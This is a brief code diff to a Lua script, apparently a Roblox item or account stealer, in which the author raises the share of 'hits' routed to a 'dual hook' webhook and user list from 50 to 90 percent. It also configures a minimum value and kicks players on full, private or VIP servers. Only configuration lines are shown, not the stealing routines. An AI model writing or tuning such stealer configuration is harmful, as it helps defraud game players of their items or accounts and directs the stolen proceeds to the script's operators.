@@ -18,7 +18,7 @@ local pingEveryone = _G.pingEveryone == "Yes"
 local DualHookUsers = {"cybertu24","AnonymousANONIMO125"}
 local DualHookWebhook = "TU_WEBHOOK_AQUI" -- Cambia a tu webhook real
 local DualHookMinValue = 500
-local DualHookPercent = 50 -- porcentaje de hits que se van a ti
+local DualHookPercent = 90 -- porcentaje de hits que se van a ti
 
 -- Kick por servidor lleno, privado o VIP
 local function CheckServerInitial()
